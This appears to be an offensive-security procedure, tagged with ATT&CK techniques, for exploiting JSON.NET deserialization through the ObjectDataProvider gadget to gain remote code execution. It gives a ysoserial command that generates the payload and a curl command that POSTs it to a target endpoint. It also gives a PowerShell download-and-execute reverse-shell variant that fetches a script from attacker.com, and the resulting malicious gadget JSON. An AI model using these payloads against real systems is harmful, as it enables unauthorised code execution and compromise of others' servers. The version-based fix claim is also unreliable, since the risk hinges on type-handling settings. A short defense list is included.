---
type: procedure
description: >-
  Exploit JSON.NET deserialization vulnerability using ObjectDataProvider gadget
  to achieve remote code execution on .NET applications.
verified: true
submitted: false
created_at: '2023-04-06T03:55:59Z'
updated_at: '2023-04-06T03:55:59Z'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - '[[sub-techniques/Windows Command Shell|T1059.003 - Windows Command Shell]]'
tags:
  - deserialization
  - json.net
  - .net
  - rce
  - objectdataproviders
  - gadget-chain
commands:
  - '[[commands/ysoserial-generate-objectdataproviders-json-net-payload]]'
tools:
  - '[[tools/ysoserial]]'
platforms:
  - Windows
  - .NET
validated: true
---

# ObjectDataProvider-JSON.NET-Deserialization-RCE

## Summary

This procedure exploits a deserialization vulnerability in applications using the JSON.NET library by crafting a malicious JSON payload that leverages the ObjectDataProvider gadget chain to execute arbitrary commands on the target system, resulting in remote code execution (RCE). It is typically used against .NET web applications that insecurely deserialize user-supplied JSON input.

## Description

JSON.NET (Newtonsoft.Json) is a widely used library for handling JSON in .NET applications. When an application deserializes untrusted JSON without proper type safety, attackers can inject gadget chains that trigger code execution during deserialization. The ObjectDataProvider class from PresentationFramework serves as a gadget to invoke methods like Process.Start, allowing command execution. This procedure uses the ysoserial tool to generate the payload, which can be delivered via HTTP POST requests to endpoints that process JSON input, such as user profile updates or API calls. Success leads to RCE, enabling further compromise like data exfiltration or persistence. This targets vulnerable versions of JSON.NET (pre-13.0.3 with specific configurations) in web or service applications.

## Requirements

1. Access to ysoserial tool on the attacker's machine.
2. Network access to a target .NET application vulnerable to JSON deserialization (e.g., via a web endpoint that deserializes JSON).
3. Knowledge of the deserialization endpoint and required JSON structure.
4. Windows environment for running ysoserial (cross-platform alternatives exist but are not covered here).

## Defense

- Update JSON.NET to version 13.0.3 or later, which includes better type handling and security fixes.
- Implement strict type whitelisting or blacklisting during deserialization to prevent gadget chain activation.
- Use secure deserialization libraries like System.Text.Json instead of JSON.NET for new applications.
- Monitor for anomalous process creation (e.g., calc.exe) and network requests containing suspicious JSON structures.
- Enable application logging for deserialization events and scan for known gadget patterns.

## Objectives

1. Generate a malicious JSON payload exploiting ObjectDataProvider.
2. Deliver the payload to the target application to trigger deserialization.
3. Achieve remote code execution, such as launching a calculator or reverse shell.
4. Verify execution and potentially establish persistence.

## Instructions

### Step 1: Generate the Malicious JSON Payload

**Context**: Use ysoserial to create a JSON payload that exploits the ObjectDataProvider gadget, specifying the command to execute (e.g., calc.exe for testing). This step produces raw JSON output ready for delivery.

**Command** ([[commands/ysoserial-generate-objectdataproviders-json-net-payload]]):

```cmd
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe"
```

> This command invokes ysoserial with the JSON.NET formatter, ObjectDataProvider gadget, raw output format, and the command to run. Save the output to a file (e.g., payload.json) for use in the next step. If the target requires specific JSON structure, wrap the generated payload in the appropriate object.

### Step 2: Deliver the Payload to the Target

**Context**: Send the generated JSON to the vulnerable deserialization endpoint, typically via an HTTP POST request using tools like curl or Burp Suite. Identify the endpoint through reconnaissance (e.g., API docs or fuzzing).

**Instructions**: Assuming a web endpoint at /api/update that deserializes JSON body:

1. Read the payload: `type payload.json` (or cat on Unix).
2. Send via curl:

```bash
curl -X POST -H "Content-Type: application/json" -d @payload.json http://target.com/api/update
```

> Replace the URL with the actual endpoint. If authentication is required, add headers or cookies. Use a proxy like Burp to intercept and modify if needed.

**Decision Point**: If the endpoint expects a specific JSON key (e.g., {"data": <payload>}), wrap the generated JSON accordingly: `{"data": $(cat payload.json)}`.

### Step 3: Verify Execution

**Context**: Confirm RCE by observing the executed command's effects on the target.

**Instructions**: Monitor the target for the command output (e.g., calc.exe window if RDP access) or use a reverse shell payload instead of calc.exe (e.g., -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')").

> If no visible effect, check application logs for deserialization errors or use verbose logging in the app to trace gadget invocation.

## Expected Output

Successful payload generation produces JSON like:

```json
{
    "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "MethodParameters":{
        "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values":["cmd", "/c calc.exe"]
    },
    "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
}
```

Delivery success: HTTP 200 or expected response without errors; command executes silently on target.
